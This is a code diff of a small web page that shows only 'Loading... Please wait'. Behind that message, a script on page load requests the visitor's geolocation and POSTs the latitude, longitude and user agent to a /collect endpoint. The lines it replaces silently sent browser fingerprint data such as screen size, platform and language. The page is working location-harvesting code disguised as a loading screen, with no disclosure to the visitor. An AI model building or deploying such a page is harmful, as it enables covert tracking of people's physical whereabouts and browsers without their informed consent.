@@ -1,39 +1,26 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
   <title>Loading...</title>
   <script>
-    async function sendInfo() {
-      const data = {
-        screen: {
-          width: screen.width,
-          height: screen.height,
-        },
-        location: window.location.href,
-        time: new Date().toString(),
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-      };
-
-      try {
-        await fetch("/collect", {
+    window.onload = function () {
+      navigator.geolocation.getCurrentPosition(function (position) {
+        fetch("/collect", {
           method: "POST",
           headers: {
-            "Content-Type": "application/json",
+            "Content-Type": "application/json"
           },
-          body: JSON.stringify(data),
+          body: JSON.stringify({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            userAgent: navigator.userAgent
+          })
         });
-      } catch (err) {
-        console.error("Error sending data:", err);
-      }
+      });
     }
-
-    window.onload = sendInfo;
   </script>
 </head>
 <body>
-  <h2 style="text-align:center; margin-top:30%;">🔍 Loading... Please wait</h2>
+  <h2>Loading... Please wait</h2>
 </body>
 </html>
